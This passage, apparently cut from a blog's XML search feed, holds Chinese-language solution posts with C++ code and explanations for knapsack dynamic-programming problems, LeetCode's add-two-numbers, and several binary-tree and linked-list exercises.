            f[j] &#x3D; max(f[j],f[j-v[i]] + w[i]);
    
    cout &lt;&lt; f[m] &lt;&lt; endl;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>AcWing 3.完全背包问题</title>
    <url>/2021/04/04/AcWing-3-%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>3.完全背包问题</p>
<a id="more"></a>
<p>有 NN 种物品和一个容量是 VV 的背包，每种物品都有无限件可用。</p>
<p>第 ii 种物品的体积是 vivi，价值是 wiwi。</p>
<p>求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。<br>输出最大价值。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行两个整数，N，VN，V，用空格隔开，分别表示物品种数和背包容积。</p>
<p>接下来有 NN 行，每行两个整数 vi,wivi,wi，用空格隔开，分别表示第 ii 种物品的体积和价值。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示最大价值。</p>
<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>0&lt;N,V≤10000&lt;N,V≤1000<br>0&lt;vi,wi≤10000&lt;vi,wi≤1000</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><pre class="line-numbers language-none"><code class="language-none">4 5
1 2
2 4
3 4
4 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://gitee.com/chzarles/images/raw/master/imgs/006eb5E0gy1g7yyd0jjcyj30wk0fpdhc.jpg" alt="image.png"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;
using namespace std;
const int N &#x3D; 1010;
int f[N][N];
int v[N],w[N];
int main()
&#123;
    int n,m;
    cin&gt;&gt;n&gt;&gt;m;
    for(int i &#x3D; 1 ; i &lt;&#x3D; n ;i ++)
    &#123;
        cin&gt;&gt;v[i]&gt;&gt;w[i];
    &#125;

    for(int i &#x3D; 1 ; i&lt;&#x3D;n ;i++)
    for(int j &#x3D; 0 ; j&lt;&#x3D;m ;j++)
    &#123;
        for(int k &#x3D; 0 ; k*v[i]&lt;&#x3D;j ; k++)
            f[i][j] &#x3D; max(f[i][j],f[i-1][j-k*v[i]]+k*w[i]);
    &#125;

    cout&lt;&lt;f[n][m]&lt;&lt;endl;
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>优化思路<br>我们列举一下更新次序的内部关系：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">f[i , j ] &#x3D; max( f[i-1,j] , f[i-1,j-v]+w ,  f[i-1,j-2*v]+2*w , f[i-1,j-3*v]+3*w , .....)
f[i , j-v]&#x3D; max(            f[i-1,j-v]   ,  f[i-1,j-2*v] + w , f[i-1,j-2*v]+2*w , .....)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>由上两式，可得出如下递推关系： </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">f[i][j]&#x3D;max(f[i,j-v]+w , f[i-1][j]) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>有了上面的关系，那么其实k循环可以不要了，核心代码优化成这样：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i &#x3D; 1 ; i &lt;&#x3D;n ;i++)
for(int j &#x3D; 0 ; j &lt;&#x3D;m ;j++)
&#123;
    f[i][j] &#x3D; f[i-1][j];
    if(j-v[i]&gt;&#x3D;0)
        f[i][j]&#x3D;max(f[i][j],f[i][j-v[i]]+w[i]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个代码和01背包的非优化写法很像啊!!!我们对比一下，下面是01背包的核心代码</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i &#x3D; 1 ; i &lt;&#x3D; n ; i++)
for(int j &#x3D; 0 ; j &lt;&#x3D; m ; j ++)
&#123;
    f[i][j] &#x3D; f[i-1][j];
    if(j-v[i]&gt;&#x3D;0)
        f[i][j] &#x3D; max(f[i][j],f[i-1][j-v[i]]+w[i]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>两个代码其实只有一句不同（注意下标）</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">f[i][j] &#x3D; max(f[i][j],f[i-1][j-v[i]]+w[i]);&#x2F;&#x2F;01背包

f[i][j] &#x3D; max(f[i][j],f[i][j-v[i]]+w[i]);&#x2F;&#x2F;完全背包问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因为和01背包代码很相像，我们很容易想到进一步优化。核心代码可以改成下面这样</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i &#x3D; 1 ; i&lt;&#x3D;n ;i++)
   for(int j &#x3D; v[i] ; j&lt;&#x3D;m ;j++)&#x2F;&#x2F;注意了，这里的j是从小到大枚举，和01背包不一样
   &#123;
           f[j] &#x3D; max(f[j],f[j-v[i]]+w[i]);
   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>综上所述，完全背包的最终写法如下：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;
using namespace std;
const int N &#x3D; 1010;
int f[N];
int v[N],w[N];
int main()
&#123;
    int n,m;
    cin&gt;&gt;n&gt;&gt;m;
    for(int i &#x3D; 1 ; i &lt;&#x3D; n ;i ++)
    &#123;
        cin&gt;&gt;v[i]&gt;&gt;w[i];
    &#125;

    for(int i &#x3D; 1 ; i&lt;&#x3D;n ;i++)
    for(int j &#x3D; v[i] ; j&lt;&#x3D;m ;j++)
    &#123;
            f[j] &#x3D; max(f[j],f[j-v[i]]+w[i]);
    &#125;
    cout&lt;&lt;f[m]&lt;&lt;endl;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>AcWing 背包问题</title>
    <url>/2021/04/01/AcWing-1.01%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>背包问题</p>
<a id="more"></a>


<p>有 NN 件物品和一个容量是 VV 的背包。每件物品只能使用一次。</p>
<p>第 ii 件物品的体积是 vivi，价值是 wiwi。</p>
<p>求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。<br>输出最大价值。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行两个整数，N，VN，V，用空格隔开，分别表示物品数量和背包容积。</p>
<p>接下来有 NN 行，每行两个整数 vi,wivi,wi，用空格隔开，分别表示第 ii 件物品的体积和价值。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示最大价值。</p>
<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>0&lt;N,V≤10000&lt;N,V≤1000<br>0&lt;vi,wi≤10000&lt;vi,wi≤1000</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><pre class="line-numbers language-none"><code class="language-none">4 5
1 2
2 4
3 4
4 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><pre class="line-numbers language-none"><code class="language-none">8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<p>21.2.10更新：</p>
<p>代码变量命名与题目一致<br>题解思路变得更详细了<br>加入了不断优化版本的解法</p>
<ol>
<li>题目介绍<br>有 NN 件物品和一个容量为 VV 的背包，每件物品有各自的价值且只能被选择一次，要求在有限的背包容量下，装入的物品总价值最大。</li>
</ol>
<p>「0-1 背包」是较为简单的动态规划问题，也是其余背包问题的基础。</p>
<p>动态规划是不断决策求最优解的过程，「0-1 背包」即是不断对第 ii 个物品的做出决策，「0-1」正好代表不选与选两种决定。</p>
<ol start="2">
<li>题解代码（C++）<br>2.1 版本1 二维<br>（1）状态f[i][j]定义：前 ii 个物品，背包容量 jj 下的最优解（最大价值）：</li>
</ol>
<p>当前的状态依赖于之前的状态，可以理解为从初始状态f[0][0] = 0开始决策，有 NN 件物品，则需要 NN 次决 策，每一次对第 ii 件物品的决策，状态f[i][j]不断由之前的状态更新而来。<br>（2）当前背包容量不够（j &lt; v[i]），没得选，因此前 ii 个物品最优解即为前 i−1i−1 个物品最优解：</p>
<p>对应代码：f[i][j] = f[i - 1][j]。<br>（3）当前背包容量够，可以选，因此需要决策选与不选第 ii 个物品：</p>
<p>选：f[i][j] = f[i - 1][j - v[i]] + w[i]。<br>不选：f[i][j] = f[i - 1][j] 。<br>我们的决策是如何取到最大价值，因此以上两种情况取 max() 。<br>代码如下：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;

using namespace std;

const int MAXN &#x3D; 1005;
int v[MAXN];    &#x2F;&#x2F; 体积
int w[MAXN];    &#x2F;&#x2F; 价值 
int f[MAXN][MAXN];  &#x2F;&#x2F; f[i][j], j体积下前i个物品的最大价值 

int main() 
&#123;
    int n, m;   
    cin &gt;&gt; n &gt;&gt; m;
    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) 
        cin &gt;&gt; v[i] &gt;&gt; w[i];

    for(int i &#x3D; 1; i &lt;&#x3D; n; i++) 
        for(int j &#x3D; 1; j &lt;&#x3D; m; j++)
        &#123;
            &#x2F;&#x2F;  当前背包容量装不进第i个物品，则价值等于前i-1个物品
            if(j &lt; v[i]) 
                f[i][j] &#x3D; f[i - 1][j];
            &#x2F;&#x2F; 能装，需进行决策是否选择第i个物品
            else    
                f[i][j] &#x3D; max(f[i - 1][j], f[i - 1][j - v[i]] + w[i]);
        &#125;           
    
    cout &lt;&lt; f[n][m] &lt;&lt; endl;
    
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.2 版本2 一维<br>将状态f[i][j]优化到一维f[j]，实际上只需要做一个等价变形。</p>
<p>为什么可以这样变形呢？我们定义的状态f[i][j]可以求得任意合法的i与j最优解，但题目只需要求得最终状态f[n][m]，因此我们只需要一维的空间来更新状态。</p>
<p>（1）状态f[j]定义：NN 件物品，背包容量j下的最优解。</p>
<p>（2）注意枚举背包容量j必须从m开始。</p>
<p>（3）为什么一维情况下枚举背包容量需要逆序？在二维情况下，状态f[i][j]是由上一轮i - 1的状态得来的，f[i][j]与f[i - 1][j]是独立的。而优化到一维后，如果我们还是正序，则有f[较小体积]更新到f[较大体积]，则有可能本应该用第i-1轮的状态却用的是第i轮的状态。</p>
<p>（4）例如，一维状态第i轮对体积为 33 的物品进行决策，则f[7]由f[4]更新而来，这里的f[4]正确应该是f[i - 1][4]，但从小到大枚举j这里的f[4]在第i轮计算却变成了f[i][4]。当逆序枚举背包容量j时，我们求f[7]同样由f[4]更新，但由于是逆序，这里的f[4]还没有在第i轮计算，所以此时实际计算的f[4]仍然是f[i - 1][4]。</p>
<p>（5）简单来说，一维情况正序更新状态f[j]需要用到前面计算的状态已经被「污染」，逆序则不会有这样的问题。</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">状态转移方程为：f[j] &#x3D; max(f[j], f[j - v[i]] + w[i] 。

for(int i &#x3D; 1; i &lt;&#x3D; n; i++) 
    for(int j &#x3D; m; j &gt;&#x3D; 0; j--)
    &#123;
        if(j &lt; v[i]) 
            f[i][j] &#x3D; f[i - 1][j];  &#x2F;&#x2F; 优化前
            f[j] &#x3D; f[j];            &#x2F;&#x2F; 优化后，该行自动成立，可省略。
        else    
            f[i][j] &#x3D; max(f[i - 1][j], f[i - 1][j - v[i]] + w[i]);  &#x2F;&#x2F; 优化前
            f[j] &#x3D; max(f[j], f[j - v[i]] + w[i]);                   &#x2F;&#x2F; 优化后
    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实际上，只有当枚举的背包容量 &gt;= v[i] 时才会更新状态，因此我们可以修改循环终止条件进一步优化。</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i &#x3D; 1; i &lt;&#x3D; n; i++)
&#123;
    for(int j &#x3D; m; j &gt;&#x3D; v[i]; j--)  
        f[j] &#x3D; max(f[j], f[j - v[i]] + w[i]);
&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于状态f[j]的补充说明<br>二维下的状态定义f[i][j]是前 ii 件物品，背包容量 jj 下的最大价值。一维下，少了前 ii 件物品这个维度，我们的代码中决策到第 ii 件物品（循环到第i轮），f[j]就是前i轮已经决策的物品且背包容量 jj 下的最大价值。</p>
<p>因此当执行完循环结构后，由于已经决策了所有物品，f[j]就是所有物品背包容量 jj 下的最大价值。即一维f[j]等价于二维f[n][j]。</p>
<p>2.3 版本3 优化输入<br>我们注意到在处理数据时，我们是一个物品一个物品，一个一个体积的枚举。</p>
<p>因此我们可以不必开两个数组记录体积和价值，而是边输入边处理。</p>
<p>#include&lt;bits/stdc++.h&gt;</p>
<p>using namespace std;</p>
<p>const int MAXN = 1005;<br>int f[MAXN];  // </p>
<p>int main()<br>{<br>    int n, m;<br>    cin &gt;&gt; n &gt;&gt; m;</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for(int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123;
    int v, w;
    cin &gt;&gt; v &gt;&gt; w;      &#x2F;&#x2F; 边输入边处理
    for(int j &#x3D; m; j &gt;&#x3D; v; j--)
        f[j] &#x3D; max(f[j], f[j - v] + w);
&#125;

cout &lt;&lt; f[m] &lt;&lt; endl;

return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>}</p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 2.两数相加</title>
    <url>/2021/03/29/Leetcode-2-%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<p>Leetcode 2.两数相加</p>
<a id="more"></a>
<h4 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2. 两数相加"></a><a href="https://leetcode-cn.com/problems/add-two-numbers/">2. 两数相加</a></h4><p>难度中等5913</p>
<p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/01/02/addtwonumber1.jpg" alt="img"></p>
<pre class="line-numbers language-none"><code class="language-none">输入：l1 &#x3D; [2,4,3], l2 &#x3D; [5,6,4]
输出：[7,0,8]
解释：342 + 465 &#x3D; 807.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：l1 &#x3D; [0], l2 &#x3D; [0]
输出：[0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>示例 3：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：l1 &#x3D; [9,9,9,9,9,9,9], l2 &#x3D; [9,9,9,9]
输出：[8,9,9,9,0,0,0,1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li>每个链表中的节点数在范围 <code>[1, 100]</code> 内</li>
<li><code>0 &lt;= Node.val &lt;= 9</code></li>
<li>题目数据保证列表表示的数字不含前导零</li>
</ul>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) &#123;
        ListNode *head &#x3D; nullptr, *tail &#x3D; nullptr;
        int carry &#x3D; 0;
        while (l1 || l2) &#123;
            int n1 &#x3D; l1 ? l1-&gt;val: 0;
            int n2 &#x3D; l2 ? l2-&gt;val: 0;
            int sum &#x3D; n1 + n2 + carry;
            if (!head) &#123;
                head &#x3D; tail &#x3D; new ListNode(sum % 10);
            &#125; else &#123;
                tail-&gt;next &#x3D; new ListNode(sum % 10);
                tail &#x3D; tail-&gt;next;
            &#125;
            carry &#x3D; sum &#x2F; 10;
            if (l1) &#123;
                l1 &#x3D; l1-&gt;next;
            &#125;
            if (l2) &#123;
                l2 &#x3D; l2-&gt;next;
            &#125;
        &#125;
        if (carry &gt; 0) &#123;
            tail-&gt;next &#x3D; new ListNode(carry);
        &#125;
        return head;
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode() : val(0), next(nullptr) &#123;&#125;
 *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;
 *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) 
    &#123;
        int s1,s2;
        int sum&#x3D;0;
        int jinwei&#x3D;0;
        ListNode *head&#x3D;new ListNode(-1);
        ListNode *h1&#x3D;head;
        while(l1 || l2)
        &#123;
        	s1&#x3D;l1?l1-&gt;val:0;
        	s2&#x3D;l2?l2-&gt;val:0;
        	sum&#x3D;s1+s2+jinwei;

        	jinwei&#x3D;sum&gt;9?1:0;
        	sum&#x3D;sum%10;

        	head-&gt;next&#x3D;new ListNode(sum);
        	head&#x3D;head-&gt;next;
        	if(l1) l1&#x3D;l1-&gt;next;
        	if(l2) l2&#x3D;l2-&gt;next;


        &#125;
        if(jinwei)
        &#123;        	
        	head-&gt;next&#x3D;new ListNode(jinwei);
        &#125;
        return h1-&gt;next;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 26. 对称的二叉树</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-26-%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p>对称的二叉树</p>
<a id="more"></a>

<p>请实现一个函数，用来判断一棵二叉树是不是对称的。</p>
<p>如果一棵二叉树和它的镜像一样，那么它是对称的。</p>
<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">如下图所示二叉树[1,2,2,3,4,4,3,null,null,null,null,null,null,null,null]为对称二叉树：
    1
   &#x2F; \
  2   2
 &#x2F; \ &#x2F; \
3  4 4  3

如下图所示二叉树[1,2,2,null,4,4,3,null,null,null,null,null,null]不是对称二叉树：
    1
   &#x2F; \
  2   2
   \ &#x2F; \
   4 4  3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for a binary tree node.
 * struct TreeNode &#123;
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    bool isSymmetric(TreeNode* root) 
    &#123;
    	if(!root) 
    		return true;
    	return dfs(root-&gt;left,root-&gt;right);
    &#125;
    bool dfs(TreeNode * p,TreeNode *q)
    &#123;
    	if(!p || !q)
    		return !p &amp;&amp; !q;
    	if(p-&gt;val !&#x3D;q-&gt;val)
    		return false;
    	return dfs(p-&gt;left,q-&gt;right) &amp;&amp;dfs(p-&gt;right,q-&gt;left);
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>算法1<br>(二叉树，递归) O(n)O(n)<br>递归判断两个子树是否互为镜像。</p>
<p>两个子树互为镜像当且仅当：</p>
<p>两个子树的根节点值相等；<br>第一棵子树的左子树和第二棵子树的右子树互为镜像，且第一棵子树的右子树和第二棵子树的左子树互为镜像；<br>时间复杂度<br>从上到下每个节点仅被遍历一遍，所以时间复杂度是 O(n)O(n)。</p>
]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 25.二叉树的镜像</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-25-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p>二叉树的镜像</p>
<a id="more"></a>


<p>输入一个二叉树，将它变换为它的镜像。</p>
<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><pre class="line-numbers language-none"><code class="language-none">输入树：
      8
     &#x2F; \
    6  10
   &#x2F; \ &#x2F; \
  5  7 9 11

 [8,6,10,5,7,9,11,null,null,null,null,null,null,null,null] 
输出树：
      8
     &#x2F; \
    10  6
   &#x2F; \ &#x2F; \
  11 9 7  5

 [8,10,6,11,9,7,5,null,null,null,null,null,null,null,null]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for a binary tree node.
 * struct TreeNode &#123;
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    void mirror(TreeNode* root) 
    &#123;
    	if(!root) 
		 	return ;
		mirror(root-&gt;left);
		mirror(root-&gt;right);
		swap(root-&gt;left,root-&gt;right);	
		 

    &#125;


&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">我们可以发现镜像后的树就是将原树的所有节点的左右儿子互换！

所以我们递归遍历原树的所有节点，将每个节点的左右儿子互换即可。

时间复杂度
原树仅被遍历一次，所以时间复杂度是 O(n)O(n)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 24.树的子结构</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-24-%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>树的子结构</p>
<a id="more"></a>
<ol start="37">
<li>树的子结构</li>
</ol>
<p>输入两棵二叉树 A，BA，B，判断 BB 是不是 AA 的子结构。</p>
<p>我们规定空树不是任何树的子结构。</p>
<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><p>树 AA：</p>
<pre class="line-numbers language-none"><code class="language-none">    8
   &#x2F; \
  8   7
 &#x2F; \
9   2
   &#x2F; \
  4   7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>树 BB：</p>
<pre class="line-numbers language-none"><code class="language-none">  8
 &#x2F; \
9   2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>返回 <strong>true</strong>，因为 BB 是 AA 的子结构。</p>
<pre class="line-numbers language-none"><code class="language-none">算法
(二叉树，递归) O(nm)O(nm)
代码分为两个部分：

遍历树A中的所有非空节点R；
判断树A中以R为根节点的子树是不是包含和树B一样的结构，且我们从根节点开始匹配；
对于第一部分，我们直接递归遍历树A即可，遇到非空节点后，就进行第二部分的判断。

对于第二部分，我们同时从根节点开始遍历两棵子树：

如果树B中的节点为空，则表示当前分支是匹配的，返回true；
如果树A中的节点为空，但树B中的节点不为空，则说明不匹配，返回false；
如果两个节点都不为空，但数值不同，则说明不匹配，返回false；
否则说明当前这个点是匹配的，然后递归判断左子树和右子树是否分别匹配即可；
时间复杂度
最坏情况下，我们对于树A中的每个节点都要递归判断一遍，每次判断在最坏情况下需要遍历完树B中的所有节点。
所以时间复杂度是 O(nm)O(nm)，其中 nn 是树A中的节点数， mm 是树B中的节点数。

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C++ 代码
&#x2F;**
 * Definition for a binary tree node.
 * struct TreeNode &#123;
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    bool hasSubtree(TreeNode* pRoot1, TreeNode* pRoot2) &#123;
        if (!pRoot1 || !pRoot2) return false;
        if (isSame(pRoot1, pRoot2)) return true;
        return hasSubtree(pRoot1-&gt;left, pRoot2) || hasSubtree(pRoot1-&gt;right, pRoot2);
    &#125;

    bool isSame(TreeNode* pRoot1, TreeNode* pRoot2) &#123;
        if (!pRoot2) return true;
        if (!pRoot1 || pRoot1-&gt;val !&#x3D; pRoot2-&gt;val) return false;
        return isSame(pRoot1-&gt;left, pRoot2-&gt;left) &amp;&amp; isSame(pRoot1-&gt;right, pRoot2-&gt;right);
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 23.合并两个排序的链表</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-23-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>23.合并两个排序的链表</p>
<a id="more"></a>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">36. 合并两个排序的链表

输入两个递增排序的链表，合并这两个链表并使新链表中的结点仍然是按照递增排序的。

样例
输入：1-&gt;3-&gt;5 , 2-&gt;4-&gt;5

输出：1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
